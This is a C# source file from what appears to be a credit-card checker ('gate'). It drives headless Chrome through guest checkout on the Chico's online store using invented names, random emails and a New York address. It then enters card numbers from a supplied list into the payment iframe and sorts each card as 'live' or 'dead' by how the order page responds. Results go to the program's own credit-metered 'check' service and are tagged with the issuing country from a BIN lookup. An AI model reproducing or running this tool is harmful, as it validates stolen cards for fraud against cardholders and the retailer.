using System;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Threading;
using System.Windows.Forms;
using System.Windows.Forms.VisualStyles;
using gateBeta;
using Newtonsoft.Json;
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using OpenQA.Selenium.Interactions;
using OpenQA.Selenium.Support.Extensions;
using OpenQA.Selenium.Support.UI;
using Keys = OpenQA.Selenium.Keys;

namespace gateDanny.gates
{
    class Chicos
    {
        ChromeDriver driver;
        check check = new check();
        string correo;
        string clave;
        int pagos = 0;
        int numeroTargeta = 1;
        private readonly Random _random = new Random();

        public string checkbin(string bin)
        {
            try
            {
                string jsonString = "";
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://lookup.binlist.net/" + bin);
                request.Method = "GET";
                request.Credentials = CredentialCache.DefaultCredentials;
                ((HttpWebRequest)request).UserAgent = "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 7.1; Trident/5.0)";
                request.Accept = "/";
                request.UseDefaultCredentials = true;
                request.Proxy.Credentials = System.Net.CredentialCache.DefaultCredentials;
                //request.ContentType = "application/x-www-form-urlencoded";
                request.ContentType = "application/x-www-form-urlencoded";
                WebResponse response = request.GetResponse();
                StreamReader sr = new StreamReader(response.GetResponseStream());
                jsonString = sr.ReadToEnd();
                sr.Close();
                //MessageBox.Show(jsonString);
                dynamic cc = JsonConvert.DeserializeObject(jsonString);
                return cc.country.name;
            }
            catch (Exception ex)
            {

                return "Desconocido";
            }
            
        }

        private string getNum()
        {
            Random obj = new Random();
            string posibles = "0123456789";
            int longitud = posibles.Length;
            char letra;
            int longitudnuevacadena = 9;
            string nuevacadena = "";
            for (int i = 0; i < longitudnuevacadena; i++)
            {
                letra = posibles[obj.Next(longitud)];
                nuevacadena += letra.ToString();
            }
            return nuevacadena;
        }

        public int RandomNumber(int min, int max)
        {
            return _random.Next(min, max);
        }

        private bool tiempoElemento(By by)
        {
            string elemento = "";
            int tiempo = 0;

            while (elemento == "")
            {
                if (tiempo <= 30)
                {
                    if (IsElementPresent(by))
                    {
                        if (driver.FindElement(by).Displayed == true)
                        {
                            elemento = "ok";
                        }
                    }

                }
                else
                {
                    elemento = "Error";
                }
                tiempo++;
            }

            if (elemento != "Error")
            {
                return true;
                //DetailProduct();
            }
            else
            {
                return false;
            }
        }


        public void load()
        {
            check.login(Variables.key);
            if(int.Parse(Variables.creditos) <= 0)
            {
                MessageBox.Show("Recargue sus creditos");
                return;
            }

           
            if (Thunder._Form1.numcc() > 0 && Variables.run==true && Variables.gate == "3")
            {

                Thunder._Form1.update_progresbar(5);
                var chromeOptions = new ChromeOptions();
                correo = "joseffernana" + getNum() + "@gmail.com";
                clave = "Jo." + getNum();

                //chromeOptions.AddArguments(new List<string>() { "headless" });
                //chromeOptions.AddArguments("--blink-settings=imagesEnabled=false", "--window-size=1920,1080");, 
                chromeOptions.AddArguments("--window-size=1920,1080", "--blink-settings=imagesEnabled=false", "--incognito", "--ignore-certificate-errors", "--headless");

                var chromeDriverService = ChromeDriverService.CreateDefaultService();
                chromeDriverService.HideCommandPromptWindow = true;

                driver = new ChromeDriver(chromeDriverService, chromeOptions);
                driver.Url = "https://www.chicos.com/store/category/view+all/cat40006/?sortOrder=lowToHigh";
                Thread.Sleep(1000);
                correo = "joseffernana" + getNum() + "@hotmail.com";


                try
                {
                    if (IsElementPresent(By.XPath("//*[@id='button']/button")))
                    {
                        Thunder._Form1.update_progresbar(10);
                        driver.FindElement(By.XPath("//*[@id='button']/button")).Click();
                        Thread.Sleep(200);
                        Thread.Sleep(1000);
                        driver.FindElement(By.XPath("//*[@id='menu-utility']/li[4]/a")).Click();
                        Thread.Sleep(500);
                        if (IsElementPresent(By.XPath("//*[@id='localizationPrefSave']/div[1]/div/button")))
                        {
                            driver.FindElement(By.XPath("//*[@id='localizationPrefSave']/div[1]/div/button")).Click();
                            Thread.Sleep(500);
                            driver.FindElement(By.XPath("//*[@id='localizationPrefSave']/div[1]/div/div/ul/li[1]")).Click();
                            Thread.Sleep(500);
                            driver.FindElement(By.XPath("//*[@id='localizationPrefSave']/div[3]/input[5]")).Submit();
                            Thread.Sleep(500);
                        }
                    }



                    Thread.Sleep(300);

                 

                    var producto = "//*[@id='product-" + RandomNumber(1, 36) + "']/article/div[1]/a[1]";

                    if (IsElementPresent(By.XPath(producto)))
                    {
                        Thunder._Form1.update_progresbar(20);
                        var pro = driver.FindElement(By.XPath(producto)).GetAttribute("href");
                        driver.Navigate().GoToUrl(pro);
                        Thread.Sleep(300);
                    }
                    else
                    {
                        restart();
                    }

                    Thread.Sleep(1000);

                    if (IsElementPresent(By.Id("autoRegister-modal")))
                    {
                        driver.ExecuteJavaScript("$('#autoRegister-modal').modal('hide');");
                    }

                    if (IsElementPresent(By.XPath("//*[@id='frmAddToBag']/div[1]/fieldset/div[4]/div/div[3]/div/div/div[2]/button[2]")))
                    {
                        driver.FindElement(By.XPath("//*[@id='frmAddToBag']/div[1]/fieldset/div[4]/div/div[3]/div/div/div[2]/button[2]")).Click();
                    }


                    Thread.Sleep(300);

                    if (tiempoElemento(By.XPath("//*[@id='add-to-bag']")))
                    {
                        Thunder._Form1.update_progresbar(40);
                        driver.FindElement(By.XPath("//*[@id='add-to-bag']")).Click();
                        Thread.Sleep(500);
                        driver.Navigate().GoToUrl("https://www.chicos.com/store/checkout/cart.jsp");
                        Thread.Sleep(500);

                    }
                    else
                    {
                        restart();
                    }



                    if (tiempoElemento(By.XPath("//*[@id='sb-checkout-btn-bottom']")))
                    {

                        driver.FindElement(By.XPath("//*[@id='sb-checkout-btn-bottom']")).Click();
                        Thread.Sleep(300);
                    }
                    else
                    {
                        restart();
                    }

                    Thread.Sleep(300);

                    if (tiempoElemento(By.XPath("//*[@id='checkout-guest']")))
                    {
                        driver.FindElement(By.XPath("//*[@id='checkout-guest']")).Click();
                        Thread.Sleep(300);
                    }
                    else
                    {
                        restart();
                    }

                    Thread.Sleep(1500);

                    if (tiempoElemento(By.XPath("//*[@id='shipping-first-name']")))
                    {
                        Thunder._Form1.update_progresbar(60);
                        driver.FindElement(By.XPath("//*[@id='shipping-first-name']")).SendKeys("DAVIS");
                        driver.FindElement(By.XPath("//*[@id='shipping-last-name']")).SendKeys("REYES");
                        driver.FindElement(By.XPath("//*[@id='shipping-email']")).SendKeys(correo);
                        driver.FindElement(By.XPath("//*[@id='shipping-phoneNumber']")).SendKeys("21345698" + RandomNumber(1, 9) + RandomNumber(1, 9));
                        Thread.Sleep(300);
                        driver.FindElement(By.XPath("//*[@id='shipping-street-address']")).SendKeys("Street " + RandomNumber(20, 80));
                        driver.FindElement(By.XPath("//*[@id='shipping-apt-unit-suite']")).SendKeys(RandomNumber(8, 59).ToString());
                        driver.FindElement(By.XPath("//*[@id='shipping-city']")).SendKeys("NEW YORK");
                        Thread.Sleep(300);
                        driver.FindElement(By.XPath("//*[@id='checkout-shipping-address']/div/div[1]/form/div[3]/div[4]/div[2]/div/div/div/button")).Click();
                        Thread.Sleep(500);
                        driver.FindElement(By.XPath("//*[@id='checkout-shipping-address']/div/div[1]/form/div[3]/div[4]/div[2]/div/div/div/div/ul/li[34]")).Click();
                        //*[@id="checkout-shipping-address"]/div/div[1]/form/div[3]/div[4]/div[2]/div/div/div/button
                        //var estado = new SelectElement(driver.FindElement(By.XPath("//*[@id='shipping-state']")));
                        //estado.SelectByValue("NY");
                        Thread.Sleep(200);
                        driver.FindElement(By.XPath("//*[@id='shipping-zip-code']")).SendKeys("10001");
                        Thread.Sleep(300);
                        driver.FindElement(By.XPath("//*[@id='checkout-shipping-address']/div/div[1]/form/div[4]/div[2]/button")).Submit();
                        Thread.Sleep(300);

                        if (tiempoElemento(By.XPath("//*[@id='modal-address-verify-modal']/div[2]/div/div[3]/button[1]")))
                        {
                            driver.FindElement(By.XPath("//*[@id='modal-address-verify-modal']/div[2]/div/div[3]/button[1]")).Click();
                        }
                        Thread.Sleep(1000);
                    }
                    else
                    {
                        restart();
                    }

                    if (tiempoElemento(By.XPath("//*[@id='checkout-shipping-options']/div/div[1]/form/div[3]/div[2]/button")))
                    {
                        Thread.Sleep(1000);
                        driver.FindElement(By.XPath("//*[@id='checkout-shipping-options']/div/div[1]/form/div[3]/div[2]/button")).Submit();
                        Thread.Sleep(1000);
                    }
                    else
                    {
                        restart();
                    }

                    if (tiempoElemento(By.XPath("//*[@id='eProtect-iframe']")))
                    {
                        Thunder._Form1.update_progresbar(70);
                        pago();
                    }
                    else
                    {
                        restart();
                    }
                }
                catch (Exception ex)
                {
                    if (Variables.run == true)
                    {
                        restart();
                    }
                    else
                    {
                       
                        Thunder._Form1.abort();
                        return;
                    }
                   
                }

            }
            else
            {
              
                Thunder._Form1.abort();
                return;
            }
        }


        private bool IsElementPresent(By by)
        {
            try
            {
                Thread.Sleep(500);
                driver.FindElement(by);
                return true;
            }
            catch (NoSuchElementException)
            {
                return false;
            }
        }

        private void restart()
        {
            try
            {
                 pagos = 0;

                driver.Close();
                driver.Quit();
                load();
            }
            catch (Exception)
            {

                
                pagos = 0;
                driver.Quit();
                load();
            }

        }

        private void pago()
        {
            try
            {
                


                if (Thunder._Form1.numcc() > 0 && Variables.run==true)
                {
                    if (pagos < 3)
                    {
                        Thunder._Form1.update_progresbar(80);

                        string cc = Thunder._Form1.nextCc();
                        string[] ccLine = cc.Split('|');
                        var ccnum = ccLine[0];
                        Thread.Sleep(1000);
                        

                        driver.SwitchTo().Frame(driver.FindElement(By.XPath("//*[@id='eProtect-iframe']")));
                        Thread.Sleep(1500);

                        driver.FindElement(By.XPath("//*[@id='accountNumber']")).SendKeys(ccLine[0]);
                        Thread.Sleep(500);
                        var mes = new SelectElement(driver.FindElement(By.XPath("//*[@id='expMonth']")));
                        mes.SelectByValue(ccLine[1]);
                        Thread.Sleep(1000);
                        var anio = new SelectElement(driver.FindElement(By.XPath("//*[@id='expYear']")));
                        anio.SelectByText(ccLine[2]);

                        if (ccLine[3].Trim().Length == 3)
                        {
                            driver.FindElement(By.XPath("//*[@id='cvv']")).SendKeys("000");

                        }
                        else if (ccLine[3].Trim().Length == 4)
                        {
                            driver.FindElement(By.XPath("//*[@id='cvv']")).SendKeys("0000");

                        }

                        Thread.Sleep(300);

                        driver.SwitchTo().ParentFrame();

                        Thread.Sleep(1000);

                        driver.FindElement(By.XPath("//*[@id='checkout-payment-options']/div/div[4]/div[3]/div/form/div[4]/div[2]/button[2]")).Click();

                        Thread.Sleep(2000);

                        if (tiempoElemento(By.XPath("//*[@id='checkout-commit-order']/div/div/form/div[2]/div[2]/button")))
                        {
                            driver.FindElement(By.XPath("//*[@id='checkout-commit-order']/div/div/form/div[2]/div[2]/button")).Submit();
                            Thread.Sleep(300);
                        }

                        Thread.Sleep(5000);

                        Thunder._Form1.update_progresbar(95);

                        if (confirmar())
                        {
                            Thunder._Form1.update_progresbar(100);
                            var pais = checkbin(cc.Substring(0, 6));
                            var guardar = numeroTargeta + " - " + cc + " - " + pais + " " + Variables.gate;
                            check.ccss(Variables.key, guardar, "lives");
                            Thunder._Form1.agrgar_live(" ** APROVADO ** - " + cc + " - " + pais);
                            check.playlive();
                            Console.WriteLine("live " + numeroTargeta + " - " + cc + " - " + correo + " - " + clave);
                            Thunder._Form1.remove_cc(0, cc.Length);
                            numeroTargeta++;
                            pagos++;
                            restart();
                        }
                        else
                        {
                            var pais = checkbin(cc.Substring(0, 6));
                            Thunder._Form1.update_progresbar(100);
                            var guardar = numeroTargeta + " - " + cc + " - " + pais + " " + Variables.gate;
                            check.ccss(Variables.key, guardar, "deads");
                            Thread.Sleep(300);
                            Thunder._Form1.agragar_dead(cc);
                            Console.WriteLine("dead " + numeroTargeta + " - " + cc + " - " + correo + " - " + clave);
                            Thunder._Form1.remove_cc(0, cc.Length);
                            numeroTargeta++;
                            pagos++;
                            pago();
                        }
                    }
                    else
                    {
                        restart();
                    }
                }
                else
                {
                  
                    Thunder._Form1.abort();
                    return;
                }
            }
            catch (Exception ex)
            {
                //MessageBox.Show(ex.ToString());
                if (Variables.run == true )
                {
                    restart();
                }
                else
                {
                  
                    Thunder._Form1.abort();
                }
               
            }

        }

         public void stop()
        {
            try
            {
                pagos = 0;
                numeroTargeta = 0;
                driver.Close();
                driver.Quit();
                Thunder._Form1.abort();
                return;
                
            }
            catch (Exception EX)
            {

                Console.WriteLine(EX.ToString());
                Thunder._Form1.abort();
                return;
            }
           
        }

        public void stop2()
        {
            try
            {
                pagos = 0;
                numeroTargeta = 0;
                driver.Close();
                driver.Quit();
                return;
            }
            catch (Exception EX)
            {

                Console.WriteLine(EX.ToString());
                return;
            }

        }

        public bool confirmar()
        {
            string estado = "";
            bool resp = false;

            int tiempo = 0;

            while (estado == "")
            {

                if (tiempo < 30)
                {


                    if (IsElementPresent(By.XPath("//*[@id='checkout-commit-order']/div/div/form/div[2]/div[2]/button")))
                    {
                        if (driver.FindElement(By.XPath("//*[@id='checkout-commit-order']/div/div/form/div[2]/div[2]/button")).Displayed == true)
                        {
                            
                                estado = "dead";
                            
                        }
                    }

                    if (IsElementPresent(By.XPath("//*[@id='skip-nav']/div/div/div/div[1]/div/div/p[1]")))
                    {
                        if (driver.FindElement(By.XPath("//*[@id='skip-nav']/div/div/div/div[1]/div/div/p[1]")).Displayed == true)
                        {
                            if (driver.FindElement(By.XPath("//*[@id='skip-nav']/div/div/div/div[1]/div/div/p[1]")).Text.Trim() != "")
                            {
                                estado = "live";
                            }
                        }
                    }

                    if (IsElementPresent(By.XPath("//*[@id='extole-js-panel-email']/form/div[1]/div[1]/div/ul/li[1]/span")))
                    {
                        if (driver.FindElement(By.XPath("//*[@id='extole-js-panel-email']/form/div[1]/div[1]/div/ul/li[1]/span")).Displayed == true)
                        {
                            if (driver.FindElement(By.XPath("//*[@id='extole-js-panel-email']/form/div[1]/div[1]/div/ul/li[1]/span")).Text.Trim() != "")
                            {
                                estado = "live";
                            }
                        }
                    }
                }
                else
                {
                    estado = "error";
                }

                tiempo++;
            }



            if (estado == "dead")
            {
                Thread.Sleep(1000);

                driver.ExecuteJavaScript("document.querySelector('#checkout-payment-options > div > div.section-review-header.row.row-tight > div.col-xs-5.section-review-change-wrapper > a').click();");
                
                Thread.Sleep(2000);
             

                return false;
            }

            if (estado == "live")
            {
                return true;
            }

            if (estado == "error")
            {
                restart();
                return false;
            }

            return false;

        }



        public static DialogResult InputBox(string title, string promptText, ref string value)
        {
            Form form = new Form();
            Label label = new Label();
            TextBox textBox = new TextBox();
            Button buttonOk = new Button();
            Button buttonCancel = new Button();

            form.Text = title;
            label.Text = promptText;
            textBox.Text = value;

            buttonOk.Text = "OK";
            buttonCancel.Text = "Cancel";
            buttonOk.DialogResult = DialogResult.OK;
            buttonCancel.DialogResult = DialogResult.Cancel;

            label.SetBounds(9, 20, 372, 13);
            textBox.SetBounds(12, 36, 372, 20);
            buttonOk.SetBounds(228, 72, 75, 23);
            buttonCancel.SetBounds(309, 72, 75, 23);

            label.AutoSize = true;
            textBox.Anchor = textBox.Anchor | AnchorStyles.Right;
            buttonOk.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
            buttonCancel.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;

            form.ClientSize = new Size(396, 107);
            form.Controls.AddRange(new Control[] { label, textBox, buttonOk, buttonCancel });
            form.ClientSize = new Size(Math.Max(300, label.Right + 10), form.ClientSize.Height);
            form.FormBorderStyle = FormBorderStyle.FixedDialog;
            form.StartPosition = FormStartPosition.CenterScreen;
            form.MinimizeBox = false;
            form.MaximizeBox = false;
            form.AcceptButton = buttonOk;
            form.CancelButton = buttonCancel;

            DialogResult dialogResult = form.ShowDialog();
            value = textBox.Text;
            return dialogResult;
        }


    }
}

